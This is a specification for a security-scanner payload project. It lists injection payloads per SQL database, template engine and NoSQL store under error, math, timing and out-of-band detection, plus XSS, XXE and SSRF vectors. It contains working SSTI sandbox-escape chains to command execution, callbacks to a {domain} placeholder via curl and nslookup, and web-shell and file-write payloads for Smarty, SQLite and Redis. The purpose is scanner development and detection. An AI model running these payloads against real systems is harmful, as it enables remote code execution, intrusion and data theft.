# Payload & Polyglot Lists - Technical Specification

## Philosophy

The goal of this project is to create **universal payload lists** - not separated by vulnerability category, but designed so that **each payload fires across as many code contexts, injection types, and vulnerability classes as possible simultaneously**.

The lists are organized by **delivery constraint** (full, short, blind, JSON-safe), not by vulnerability type. The question is never "which vuln am I testing for" - it's **"what encoding does the input channel accept?"**

A single polyglot string should break out of as many syntactic contexts as possible (quotes, comments, tags, template delimiters) and trigger detection across multiple vulnerability classes at once. Where true polyglot fusion isn't practical (e.g., time-based SQLi requires DB-specific syntax), payloads are still designed to cover maximum context breakout within their class.

### Canonical Canary Values

**Any math/computation payload that reflects a value in the response MUST resolve to `1337` or `7331`.** These are the only two canary values used across the entire project. This makes detection trivial - grep for `1337` or `7331` in the response. No other magic numbers (`49`, `443556`, `1787569`, etc.). Two values, universal, easy to scan for.

- `1337` - primary canary (`7*191`, `1337*1`, `abs(-1337)`)
- `7331` - secondary canary (`7331*1`, `7*1047+2`, etc.) used when a second distinct value is needed (e.g., boolean differential: true path returns `1337`, false path returns `7331`)

---

## The Four Detection Pillars (MANDATORY)

**Every key injection payload class MUST have payloads that can be detected in all four of these ways.** This is non-negotiable - if a category is missing one of these detection types, it has a gap that needs to be filled.

| # | Detection Pillar | What It Does | Why It Matters | Signal To Look For |
|---|---|---|---|---|
| 1 | **Error-Based** | Trigger verbose errors, exceptions, stack traces, or parser failures | Works when the app reflects error details. Fastest confirmation - you see the proof in the response. | SQL errors, template syntax errors, XML parser errors, stack traces, type mismatch exceptions, compile/parse failures |
| 2 | **Math / Computation** | Inject arithmetic that produces a **known, unique result** the scanner can grep for | Works when output is reflected but you can't trigger errors. The computed value proves code executed, not just reflected as a string. **The reflected value must always be `1337` or `7331`** - these are our canonical canary values. Every math payload must resolve to one of these two numbers so detection is a simple grep. | `1337*1` → `1337`, `7331*1` → `7331`, `(1337)`, `abs(-1337)`, `7*191` → `1337`. Each language has its own math syntax but the result is always `1337` or `7331`. |
| 3 | **Time-Based / Blind** | Cause a **measurable delay** in the response | Works when there is **zero output** - no errors, no reflection, completely blind. The only signal is the response taking longer than baseline. | `sleep(5)`, `WAITFOR DELAY '0:0:5'`, `pg_sleep(5)`, `DBMS_LOCK.SLEEP(5)`, `RANDOMBLOB()`, `time.sleep()`, `Thread.sleep()`, CPU-heavy operations |
| 4 | **Out-of-Band (OOB)** | Force the target to make an **external request** to attacker-controlled infrastructure | Works when there is no output AND timing is unreliable (async processing, queued jobs, second-order execution). Also confirms exploitability beyond just detection. | DNS lookup to `{domain}`, HTTP callback, `/dev/tcp/{domain}/80`, `certutil`, `curl`, `nslookup`, `Invoke-WebRequest`, DB-specific OOB (`UTL_HTTP`, `xp_dirtree`, `COPY TO PROGRAM`) |

**Additionally**, these supplemental detection methods should be used where applicable:

| Detection Method | Description | Signal |
|---|---|---|
| **Reflection / Content** | Injected content appears verbatim or rendered in the response | HTML rendered, headers reflected, data echoed back |
| **Boolean / Differential** | True vs false condition changes observable response | `1=1` vs `1=2`, content presence/absence, status code changes, response size delta |
| **Information Disclosure** | Leak environment, config, or filesystem data | `printenv`, `/etc/passwd`, cloud metadata, env vars, version strings |

### How The Four Pillars Apply Per Category

Every injection class in this project must answer: **"Do we have error, math, timing, AND OOB payloads for this?"**

For example, SQL Injection:
- **Error:** `' AND 1=CONVERT(int,(SELECT @@version))--` → SQL error leaks version
- **Math:** `' AND 1=(SELECT 7*191)--` → `1337` appears in response/error
- **Timing:** `' AND SLEEP(5)--` → response delayed 5 seconds
- **OOB:** `'; EXEC master..xp_dirtree '\\{domain}\a'--` → DNS callback

For SSTI:
- **Error:** `{{invalid.syntax.here}}` → template engine error with engine name/version
- **Math:** `{{7*191}}` → `1337` in response
- **Timing:** `{{__import__("time").sleep(5)}}` → 5 second delay
- **OOB:** `{{__import__("urllib.request").request.urlopen("http://{domain}")}}` → HTTP callback

For OS Command Injection:
- **Error:** `; invalidcommand 2>&1` → "command not found" error text
- **Math:** `$(expr 7 \* 191)` or `; echo $((7*191))` → `1337` reflected
- **Timing:** `; sleep 5` / `& timeout 5` → response delayed
- **OOB:** `; nslookup {domain}` / `& ping {domain}` → DNS/ICMP callback

**If a category cannot support one of the four pillars** (e.g., clickjacking has no "math-based" variant), document why explicitly. But for all code execution and injection classes, all four MUST be present.

---

## Operating System Coverage

Payloads that involve OS interaction must cover:

| OS | Shells / Contexts |
|---|---|
| **Linux** | `/bin/bash`, `/bin/sh`, busybox, `$()`, backticks |
| **Windows** | `cmd.exe`, `powershell`, `certutil`, `%PROGRAMFILES%` variable substring tricks |
| **macOS** | `/bin/bash`, `/bin/zsh`, Darwin-specific paths |

---

## Vulnerability Categories & Sub-Payloads

### 1. SQL Injection (SQLi)

**Database Dialects & Four Pillars Per Dialect:**

#### MySQL / MariaDB
| Pillar | Payload Syntax |
|---|---|
| **Error** | `extractvalue(1,concat(0x7e,(SELECT version())))`, `updatexml(1,concat(0x7e,(SELECT version())),1)`, `exp(~(SELECT*FROM(SELECT 1)x))`, `CAST((SELECT version()) AS SIGNED)`, `JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))` |
| **Math** | `SELECT 7*191` → `1337`, `IF(1=1,7*191,0)` |
| **Timing** | `SLEEP(5)`, `IF(1=1,SLEEP(5),0)`, `BENCHMARK(5000000,SHA1('test'))`, `IF(NOW()=SYSDATE(),SLEEP(5),0)` |
| **OOB** | `LOAD_FILE('\\\\{domain}\\a')`, `SELECT ... INTO OUTFILE '\\\\{domain}\\a'`, `SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{domain}\\\\a'))` |

#### Microsoft SQL Server (MSSQL)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `CONVERT(int,@@version)`, `CAST(@@version AS int)`, `1/0`, `@@version` in type mismatch |
| **Math** | `SELECT 7*191` → `1337` |
| **Timing** | `WAITFOR DELAY '0:0:5'`, `IF(1=1) WAITFOR DELAY '0:0:5'`, `STACKED; WAITFOR DELAY '0:0:5'--` |
| **OOB** | `EXEC master..xp_dirtree '\\{domain}\a'`, `EXEC master..xp_fileexist '\\{domain}\a'`, `EXEC master..xp_subdirs '\\{domain}\a'`, `DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.{domain}\a';EXEC master..xp_dirtree @q` |

#### PostgreSQL
| Pillar | Payload Syntax |
|---|---|
| **Error** | `CAST(version() AS int)`, `1/(SELECT 0)`, `' AND 1=CAST((SELECT version()) AS int)--` |
| **Math** | `SELECT 7*191` → `1337` |
| **Timing** | `pg_sleep(5)`, `(SELECT pg_sleep(5))`, `1;SELECT pg_sleep(5)--`, `GENERATE_SERIES(1,1000000)` (CPU burn) |
| **OOB** | `COPY (SELECT '') TO PROGRAM 'nslookup {domain}'`, `COPY (SELECT '') TO PROGRAM 'curl http://{domain}'`, `dblink_connect('host={domain} ...')`, `lo_import('\\\\{domain}\\a')` |

#### Oracle
| Pillar | Payload Syntax |
|---|---|
| **Error** | `CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))`, `UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))`, `TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))` |
| **Math** | `SELECT 7*191 FROM dual` → `1337` |
| **Timing** | `DBMS_LOCK.SLEEP(5)`, `DBMS_PIPE.RECEIVE_MESSAGE('a',5)`, `UTL_INADDR.GET_HOST_ADDRESS('sleep5.{domain}')` (DNS delay), heavy query on `ALL_OBJECTS` |
| **OOB** | `UTL_HTTP.REQUEST('http://{domain}/'||version)`, `UTL_INADDR.GET_HOST_ADDRESS('{domain}')`, `HTTPURITYPE('http://{domain}').GETCLOB()`, `SYS.DBMS_LDAP.INIT('{domain}',80)` |

#### SQLite
| Pillar | Payload Syntax |
|---|---|
| **Error** | `CAST(sqlite_version() AS int)`, invalid function calls, `abs(-9223372036854775808)` (integer overflow) |
| **Math** | `SELECT 7*191` → `1337` |
| **Timing** | `RANDOMBLOB(500000000/2)` (CPU burn), `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))` |
| **OOB** | `ATTACH DATABASE '/var/www/shell.php' AS lol` (write file), `load_extension()` (if enabled) - limited OOB capability |

#### IBM DB2
| Pillar | Payload Syntax |
|---|---|
| **Error** | `CAST(CURRENT SERVER AS int)`, `VALUES XMLPARSE(DOCUMENT '1337')` with type mismatch |
| **Math** | `SELECT 7*191 FROM SYSIBM.SYSDUMMY1` → `1337` |
| **Timing** | `CALL DBMS_LOCK.SLEEP(5)`, heavy `SYSIBM.SYSTABLES` self-join |
| **OOB** | `XMLPARSE(DOCUMENT(HTTP_GET('http://{domain}')))`, `xp_cmdshell` (if configured) |

#### Amazon Redshift
| Pillar | Payload Syntax |
|---|---|
| **Error** | `CAST(version() AS int)`, `1/0` |
| **Math** | `SELECT 7*191` → `1337` |
| **Timing** | `pg_sleep(5)` (PostgreSQL-based), heavy `SVV_TABLE_INFO` query |
| **OOB** | `COPY ... FROM 's3://...'` (with controlled S3), limited direct OOB |

#### CockroachDB
| Pillar | Payload Syntax |
|---|---|
| **Error** | `CAST(version() AS int)` |
| **Math** | `SELECT 7*191` → `1337` |
| **Timing** | `pg_sleep(5)` (PostgreSQL-compatible) |
| **OOB** | Limited - PostgreSQL-compatible where applicable |

**Context Breakout:**
- Single quote `'`, double quote `"`, backtick `` ` ``
- Numeric (no quotes needed)
- `LIKE` clause, `ORDER BY`, `GROUP BY`, `LIMIT`/`OFFSET`/`FETCH`, `HAVING`
- Parenthetical nesting `))`, comment termination `*/`
- JSON/REST parameter contexts
- `IN (...)` list contexts
- `BETWEEN ... AND ...` contexts

**Comment Syntax Per Dialect:**
- MySQL: `-- ` (trailing space), `#`, `/* */`, `/*!50000 ... */` (version conditional)
- MSSQL: `-- `, `/* */`
- PostgreSQL: `-- `, `/* */`
- Oracle: `-- `, `/* */`
- SQLite: `-- `, `/* */`

---

### 2. Cross-Site Scripting (XSS)

**Sub-Types:**
- Reflected XSS
- Stored/Persistent XSS
- DOM-based XSS
- Mutation XSS (mXSS)
- Blind XSS (callback-based, fires in admin panels / log viewers)

**Context Breakout:**
- Double-quoted HTML attributes
- Single-quoted HTML attributes
- Unquoted HTML attributes
- HTML comments (`<!-- -->`)
- Inside `<script>` tags (JS string: single, double, template literal, regex, comment)
- Inside `<style>`, `<title>`, `<textarea>`, `<noscript>`, `<noembed>`, `<xmp>`
- `href` / `src` / `xlink:href` attributes (javascript: URI)
- Event handlers (`onclick`, `onerror`, `onload`, `onmouseover`, `onfocus`, `ontoggle`, `onbegin`)
- JS sinks (`eval()`, `setTimeout()`, `setInterval()`, `new Function()`, `innerHTML`, `outerHTML`, `document.write`)

**Evasion Techniques:**
- Mixed case (`jaVasCript:`, `oNcliCk`)
- HTML entity encoding (`&#x27;`, `&#039;`)
- URL encoding (`%3C`, `%3E`, `%22`)
- Hex encoding (`\x3c`, `\x3e`)
- Unicode encoding (`\u003c`)
- Double encoding
- Null bytes (`%00`)
- CRLF injection into HTTP headers for response splitting XSS
- Filter bypass patterns (closing regex patterns, backtick escaping, tag-stripping bypass)
- CSP bypass techniques (JSONP endpoints, `base-uri`, `script-src` gadgets)

---

### 3. Server-Side Template Injection (SSTI)

**Per-Engine Four Pillars:**

#### Jinja2 (Python)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{invalid.syntax.here}}`, `{{[].__class__.__mro__[99]}}` (index out of range), `{% invalidtag %}` |
| **Math** | `{{7*191}}` → `1337`, `{{7*'191'}}` → `191191191191191191191` (string repeat - fingerprints Jinja2 vs Twig) |
| **Timing** | `{{''.__class__.__mro__[1].__subclasses__()[N]('sleep 5',shell=True,stdout=-1).communicate()}}`, `{{__import__("time").sleep(5)}}` (if `__import__` accessible) |
| **OOB** | `{{''.__class__.__mro__[1].__subclasses__()[N]('curl http://{domain}',shell=True,stdout=-1).communicate()}}`, `{{config.__class__.__init__.__globals__['os'].popen('nslookup {domain}').read()}}` |

**Jinja2 Sandbox Escape Chains:**
- `__class__.__mro__[1].__subclasses__()` → find `subprocess.Popen` or `os._wrap_close`
- `config.__class__.__init__.__globals__['os']`
- `cycler.__init__.__globals__.os`, `joiner.__init__.__globals__.os`, `namespace.__init__.__globals__.os`
- `request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")`
- `lipsum.__globals__['os'].popen(...)` 

#### Mako (Python)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `${invalid}`, `${1/0}` |
| **Math** | `${7*191}` → `1337` |
| **Timing** | `${__import__("time").sleep(5)}` |
| **OOB** | `${__import__("urllib.request").request.urlopen("http://{domain}")}`, `${__import__("os").system("nslookup {domain}")}` |

**Mako-specific paths:** `${self.module.cache.util.os.system("id")}`, `${self.template.__init__.__globals__['os'].system('id')}`

#### Tornado (Python)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{1/0}}`, `{%invalid%}` |
| **Math** | `{{7*191}}` → `1337` |
| **Timing** | `{%import time%}{{time.sleep(5)}}`, `{%import os%}{{os.popen("sleep 5").read()}}` |
| **OOB** | `{%import os%}{{os.popen("nslookup {domain}").read()}}`, `{%import urllib.request%}{{urllib.request.urlopen("http://{domain}")}}` |

#### Django (Python)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{% debug %}` (dumps debug context), `{{invalid_var}}` (if DEBUG=True leaks info) |
| **Math** | `{{7|multiply:191}}` - Django templates have limited expression support, math requires custom filters |
| **Timing** | Limited - Django templates intentionally don't support arbitrary code execution |
| **OOB** | Limited - primary attack is `{{settings.SECRET_KEY}}`, `{{settings.DATABASES}}` for information disclosure |

#### Freemarker (Java)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `${invalid!}`, `<#assign x = "foo"?number>` (type error) |
| **Math** | `${7*191}` → `1337`, `${(7*191)?c}` |
| **Timing** | `${"freemarker.template.utility.Execute"?new()("sleep 9")}`, `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 9")}` |
| **OOB** | `${"freemarker.template.utility.Execute"?new()("nslookup {domain}")}`, `${"freemarker.template.utility.Execute"?new()("curl http://{domain}")}` |

**Freemarker Built-ins for RCE:**
- `"freemarker.template.utility.Execute"?new()` - direct command execution
- `"freemarker.template.utility.ObjectConstructor"?new()` - arbitrary constructor
- `"freemarker.template.utility.JythonRuntime"?new()` - Jython execution

#### Velocity (Java)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `$foo.bar.invalid` (method not found), `#set($x = 1/0)` |
| **Math** | `#set($x = 7*191)$x` → `1337`, `#set($run = 7*191)$run` |
| **Timing** | `#set($rt = $class.inspect("java.lang.Runtime").type.getRuntime())$rt.exec("sleep 9")` |
| **OOB** | `#set($rt = $class.inspect("java.lang.Runtime").type.getRuntime())$rt.exec("nslookup {domain}")`, `$response.sendRedirect("http://{domain}")` |

**Velocity-specific access:**
- `$class.inspect("java.lang.Runtime")` for reflection
- `$response.sendRedirect()` for SSRF
- `#evaluate()` for nested template evaluation

#### Thymeleaf (Java)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `__${T(invalid)}__` (class not found), malformed SpEL |
| **Math** | `__${7*191}__::x` → `1337`, `*{T(java.lang.Math).abs(-1337)}` |
| **Timing** | `__${T(java.lang.Thread).sleep(5000)}__::x` |
| **OOB** | `__${T(java.lang.Runtime).getRuntime().exec('nslookup {domain}')}__::x`, `__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl http://{domain}').getInputStream())}__::x` |

**Thymeleaf delimiters:** `*{...}`, `${...}`, `__${...}__::x` (preprocessor expression - common injection point)

#### Spring Expression Language (SpEL)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `${T(invalid.Class)}` (class not found) |
| **Math** | `${7*191}` → `1337`, `#{7*191}` → `1337`, `T(java.lang.Math).abs(-1337)` |
| **Timing** | `T(java.lang.Thread).sleep(5000)`, `T(java.lang.Runtime).getRuntime().exec('sleep 5')` |
| **OOB** | `T(java.lang.Runtime).getRuntime().exec('nslookup {domain}')`, `T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl http://{domain}').getInputStream())`, `new java.net.URL("http://{domain}").openStream()` |

#### Pebble (Java)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{invalid.method()}}`, `{{"foo".invalidFilter()}}` |
| **Math** | `{{7*191}}` → `1337` |
| **Timing** | `{% set cmd = 'sleep 5' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}` |
| **OOB** | Same exec chain with `nslookup {domain}` / `curl http://{domain}` |

#### Handlebars (JavaScript/Node)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{#with invalid}}{{/with}}` (context error), `{{lookup . "constructor"}}` |
| **Math** | Limited - Handlebars doesn't evaluate expressions. Requires helper abuse or prototype chain traversal |
| **Timing** | `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}...require('child_process').exec('sleep 5')...{{/with}}{{/with}}{{/with}}` |
| **OOB** | Same chain with `curl http://{domain}` or `nslookup {domain}` |

#### EJS (JavaScript/Node)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `<%= invalid %>` (ReferenceError), `<%= 1/0 %>` (Infinity) |
| **Math** | `<%= 7*191 %>` → `1337` |
| **Timing** | `<%= require('child_process').execSync('sleep 5') %>`, `<%= global.process.mainModule.require('child_process').execSync('sleep 5') %>` |
| **OOB** | `<%= require('child_process').execSync('nslookup {domain}') %>`, `<%= require('http').get('http://{domain}') %>` |

#### Nunjucks (JavaScript/Node)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{invalid()}}`, `{% invalidtag %}` |
| **Math** | `{{7*191}}` → `1337`, `{{range(1337)}}` (returns array of 1337 items - length probe) |
| **Timing** | `{{range(9999999999)}}` (CPU burn), constructor chain to `child_process.execSync('sleep 5')` |
| **OOB** | Constructor chain to `require('child_process').execSync('nslookup {domain}')` |

#### Pug / Jade (JavaScript/Node)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `#{invalid}`, malformed Pug syntax |
| **Math** | `#{7*191}` → `1337` |
| **Timing** | `#{global.process.mainModule.require('child_process').execSync('sleep 5')}` |
| **OOB** | `#{global.process.mainModule.require('child_process').execSync('nslookup {domain}')}` |

#### ERB (Ruby)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `<%= invalid %>` (NameError), `<%= 1/0 %>` (ZeroDivisionError) |
| **Math** | `<%= 7*191 %>` → `1337` |
| **Timing** | `<%= sleep(5) %>`, `<%= \`sleep 5\` %>` |
| **OOB** | `<%= \`nslookup {domain}\` %>`, `<%= require 'net/http'; Net::HTTP.get(URI('http://{domain}')) %>`, `<%= system("curl http://{domain}") %>` |

#### Twig (PHP)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{invalid()}}`, `{{7/0}}` (DivisionByZeroError) |
| **Math** | `{{7*191}}` → `1337`, `{{7*'191'}}` → `1337` (numeric - fingerprints Twig vs Jinja2 since Jinja2 does string repeat) |
| **Timing** | `{{['sleep 5']|filter('system')}}`, `{{['sleep','5']|sort('exec')}}` |
| **OOB** | `{{['nslookup {domain}']|filter('system')}}`, `{{['curl http://{domain}']|filter('exec')}}`, `{{app.request.server.all|join(',')}}` (info leak) |

**Twig filter abuse:** `|filter('system')`, `|sort('exec')`, `|map('exec')`, `|reduce('exec')`

#### Smarty (PHP)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{invalid}`, `{math equation="1/0"}` |
| **Math** | `{math equation="7*191"}` → `1337`, `{$smarty.version}` (info disclosure) |
| **Timing** | `{system('sleep 5')}`, `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}` |
| **OOB** | `{system('nslookup {domain}')}`, `{fetch file="http://{domain}"}` |

#### Blade (PHP / Laravel)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{invalid}}` (undefined variable), `{!!invalid!!}` |
| **Math** | `{{7*191}}` → `1337` |
| **Timing** | Blade escapes by default - requires `{!! !!}` unescaped or `@php sleep(5) @endphp` |
| **OOB** | `@php system('nslookup {domain}') @endphp`, `@php file_get_contents('http://{domain}') @endphp` |

#### Razor (.NET / C#)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `@(invalid)` (CompilationError), `@{throw new Exception("test");}` |
| **Math** | `@(7*191)` → `1337` |
| **Timing** | `@{System.Threading.Thread.Sleep(5000);}` |
| **OOB** | `@{new System.Net.WebClient().DownloadString("http://{domain}");}`, `@{System.Diagnostics.Process.Start("nslookup","{domain}");}` |

#### Go Templates (`text/template`, `html/template`)
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{.InvalidField}}` (nil pointer / missing field), `{{call .Invalid}}` |
| **Math** | Limited - Go templates don't support arithmetic. Requires custom functions: `{{multiply 7 191}}` if defined |
| **Timing** | Limited - no arbitrary code execution from templates without custom funcs |
| **OOB** | Limited - Go templates are sandboxed. Attack is primarily information disclosure via `{{.}}` (dump all data), `{{printf "%v" .}}` |

**Context Delimiters (Polyglot Coverage):**
- `{{ }}` - Jinja2, Django, Handlebars, Angular, Vue, Twig, Nunjucks, Pebble, Go, Blade
- `${ }` - Java EL, JavaScript template literals, Freemarker, Mako, SpEL
- `${{ }}` - some Java EL double-evaluation contexts
- `<%= %>` - ERB, EJS, JSP
- `#{ }` - Ruby string interpolation, Java EL, Thymeleaf, Pug/Jade
- `{% %}` - Jinja2, Django, Twig, Nunjucks
- `#set()` / `$variable` - Velocity
- `[= ]` / `[# ]` - Freemarker alternative syntax
- `*{ }` - Thymeleaf
- `@( )` / `@{ }` - Razor
- `{# }` - Nunjucks, Twig comments
- `__${ }__::x` - Thymeleaf preprocessor

---

### 4. OS Command Injection

**Injection Operators:**
- `;` - command separator (Unix)
- `|` - pipe
- `||` - OR (execute if previous fails)
- `&` - background (Unix), separator (Windows)
- `&&` - AND (execute if previous succeeds)
- `$()` - command substitution (bash)
- `` ` ` `` - command substitution (bash, Perl)
- `\n` / `%0a` - newline command separator
- `$IFS` - internal field separator (space bypass)
- `{command,arg}` - brace expansion (bash)
- `$PATH:~n,m` / `%PROGRAMFILES:~n,m%` - variable substring (Windows)

**OS-Specific Commands:**
- **Linux/macOS:** `id`, `whoami`, `printenv`, `cat /etc/passwd`, `sleep`, `ping`, `/dev/tcp` OOB
- **Windows:** `whoami`, `systeminfo`, `net user`, `set`, `timeout`, `ping`, `certutil`, `powershell`, `dir`

**Shell Contexts:**
- Bash, sh, zsh, dash
- cmd.exe, PowerShell
- Perl (`system()`, `exec()`, backticks, `@{[system ...]}`)
- Python (`os.system()`, `subprocess`, `__import__`)
- Ruby (`system()`, `exec()`, backticks, `%x()`)
- PHP (`exec()`, `shell_exec()`, `system()`, `passthru()`, `popen()`, `proc_open()`)
- Node.js (`child_process.execSync()`, `require('child_process')`)
- Java (`Runtime.getRuntime().exec()`, `ProcessBuilder`)
- .NET (`System.Diagnostics.ProcessStartInfo`, `Process.Start`)
- Go (`os/exec`)
- Shellshock (`() { :; };`)

**Evasion:**
- Quoted character insertion (`p"r"i"n"tenv`, `p'r'i'n'tenv`)
- `$IFS` as space replacement
- `${IFS}` with comment terminators
- Hex/octal/unicode encoded characters
- Wildcard globbing (`/???/??t /???/p??s??`)
- `$'\x63\x61\x74'` (bash ANSI-C quoting)

---

### 5. NoSQL Injection

**Per-Database Four Pillars:**

#### MongoDB
| Pillar | Payload Syntax |
|---|---|
| **Error** | `{"$invalidOp": 1}` (unknown operator error), malformed BSON, `db.collection.find({$where: "invalid("})` |
| **Math** | `$where: 'return 7*191'` → `1337` in response, `{"$expr": {"$multiply": [7, 191]}}` |
| **Timing** | `$where: 'sleep(5000)'`, `$where: 'function(){sleep(5000);return true;}'`, `$where: '(function(){var d=new Date();while(new Date()-d<5000);return true;})()'` |
| **OOB** | `$where: 'this.a=fetch("http://{domain}")'`, `$where: 'var x=new XMLHttpRequest();x.open("GET","http://{domain}",false);x.send();'` (limited, depends on JS engine) |

**MongoDB Operators:**
- Comparison: `$eq`, `$ne`, `$gt`, `$gte`, `$lt`, `$lte`, `$in`, `$nin`
- Logical: `$and`, `$or`, `$not`, `$nor`
- Element: `$exists`, `$type`
- Evaluation: `$regex`, `$where`, `$expr`, `$mod`, `$text`, `$jsonSchema`
- Array: `$all`, `$elemMatch`, `$size`
- Special: `$func`, `$var_dump` (PHP driver quirks)

**MongoDB Injection Contexts:**
- JSON body: `{"username": {"$ne": null}}`
- Query param: `username[$ne]=null`, `username[$regex]=^a`
- Aggregation pipeline: `$lookup`, `$group`, `$match` manipulation
- MapReduce: `db.collection.mapReduce(function(){emit(1,1)}, ...)`

#### CouchDB
| Pillar | Payload Syntax |
|---|---|
| **Error** | Malformed Mango query syntax, invalid selector operators |
| **Math** | Limited - inject into view functions: `function(doc){emit(7*191, doc);}` |
| **Timing** | Heavy view computation, `while(new Date()-d<5000);` in design doc functions |
| **OOB** | Replication to attacker-controlled CouchDB: `{"source":"db","target":"http://{domain}/db"}`, `_changes` feed manipulation |

**CouchDB Operators (Mango):**
- `$eq`, `$ne`, `$gt`, `$gte`, `$lt`, `$lte`
- `$in`, `$nin`, `$exists`, `$type`
- `$regex`, `$or`, `$and`, `$not`, `$nor`
- `$all`, `$elemMatch`, `$size`, `$mod`

#### Cassandra (CQL)
| Pillar | Payload Syntax |
|---|---|
| **Error** | Type mismatch: `WHERE id = 'text'` on int column, invalid CQL syntax |
| **Math** | Limited - CQL doesn't support arbitrary expressions. UDF if enabled: `CREATE FUNCTION ... RETURNS int ... RETURN 7*191;` |
| **Timing** | Heavy `SELECT` on large partitions, `ALLOW FILTERING` on unindexed columns |
| **OOB** | UDF with Java: `CREATE FUNCTION oob ... LANGUAGE java AS 'new java.net.URL("http://{domain}").openConnection().connect();'` (if UDFs enabled) |

#### Amazon DynamoDB
| Pillar | Payload Syntax |
|---|---|
| **Error** | Invalid `FilterExpression` syntax, type mismatch in `ExpressionAttributeValues` |
| **Math** | Limited - DynamoDB doesn't evaluate expressions server-side in query results |
| **Timing** | Heavy `Scan` operations with complex `FilterExpression` |
| **OOB** | Not directly possible from DynamoDB itself - attack surface is in the application layer |

**DynamoDB Operators:**
- `EQ`, `NE`, `GT`, `LT`, `GE`, `LE`
- `BETWEEN`, `BEGINS_WITH`
- `CONTAINS`, `NOT_CONTAINS`
- `IN`, `NULL`, `NOT_NULL`
- `attribute_exists()`, `attribute_not_exists()`, `attribute_type()`
- `contains()`, `begins_with()`, `size()`

#### Redis
| Pillar | Payload Syntax |
|---|---|
| **Error** | `ERR wrong number of arguments`, `WRONGTYPE`, syntax errors from injected commands |
| **Math** | `EVAL "return 7*191" 0` → `1337` |
| **Timing** | `DEBUG SLEEP 5` (if debug enabled), `EVAL "local t=os.clock();while os.clock()-t<5 do end" 0`, heavy `KEYS *` or `SORT` |
| **OOB** | `SLAVEOF {domain} 6379` (replication to attacker), `MIGRATE {domain} 6379 ...`, `CONFIG SET dir /tmp; CONFIG SET dbfilename shell.php; SAVE` (write file) |

**Redis Injection Contexts:**
- RESP protocol injection via CRLF: `\r\nSET injected value\r\n`
- Lua scripting via `EVAL`
- Pub/Sub injection
- Command separator via newline in inline commands

#### Elasticsearch
| Pillar | Payload Syntax |
|---|---|
| **Error** | Malformed JSON query DSL, invalid field names, script compilation errors |
| **Math** | `"script": {"source": "7*191"}` → `1337` in Painless scripting |
| **Timing** | `"script": {"source": "Thread.sleep(5000)"}` (if Painless sandbox allows), heavy aggregation queries, `"size": 10000` on large indices |
| **OOB** | `"script": {"source": "new URL('http://{domain}').text"}` (depends on Painless sandbox), `_snapshot` API to attacker-controlled repo |

**Elasticsearch Injection Contexts:**
- Query DSL JSON body
- Painless scripting in `script_fields`, `script` queries, `_update` API
- `_search` template injection
- Kibana OGNL/script injection (older versions)

#### Firebase Realtime Database / Firestore
| Pillar | Payload Syntax |
|---|---|
| **Error** | Malformed REST query params, invalid `orderBy`, `equalTo` type mismatches |
| **Math** | Not applicable - Firebase doesn't evaluate expressions |
| **Timing** | Heavy queries on unindexed data (slow but not controllable delay) |
| **OOB** | Not directly - attack surface is in security rules misconfiguration and exposed REST endpoints |

**Firebase Attack Surface:**
- `/.json` endpoint exposure (entire DB dump)
- Security rules bypass via REST API
- `orderBy` / `equalTo` / `startAt` / `endAt` manipulation
- `.write` rule exploitation

---

### 6. XML External Entity (XXE) Injection

**Sub-Payload Types:**
- Classic XXE (file read via `SYSTEM "file:///etc/passwd"`)
- Blind/OOB XXE (external DTD + HTTP/FTP callback to `{domain}`)
- Error-based XXE (trigger parser errors that leak file content)
- XInclude attacks (`<xi:include href="file:///etc/passwd">`)
- SVG-based XXE (embedded in image uploads)
- SOAP/SAML-based XXE
- XXE in Office documents (.docx, .xlsx, .pptx - they're ZIP'd XML)
- XXE via file upload (SVG, XML, XLSX, DOCX)
- Parameter entity injection (`%xxe;`)
- PHP expect wrapper (`expect://id`)
- PHP filter wrapper (`php://filter/convert.base64-encode/resource=`)

**File Targets:**
- Linux: `/etc/passwd`, `/etc/hosts`, `/etc/hostname`, `/proc/self/environ`, `/proc/N/environ`
- Windows: `C:\windows\system32\drivers\etc\hosts`, `C:\boot.ini`
- Cloud metadata: `http://169.254.169.254/`, GCP, Azure metadata endpoints

**Encoding Variants:**
- Raw XML
- URL-encoded
- UTF-7 / UTF-16 encoding to bypass WAFs

---

### 7. Server-Side Request Forgery (SSRF)

**Protocol Schemes:**
- `http://`, `https://`
- `file://` (local file read)
- `gopher://` (raw TCP - Redis, SMTP, MySQL protocol attacks)
- `dict://` (port scanning, banner grabbing)
- `ftp://`, `sftp://`
- `ldap://`, `ldaps://`
- `tftp://`
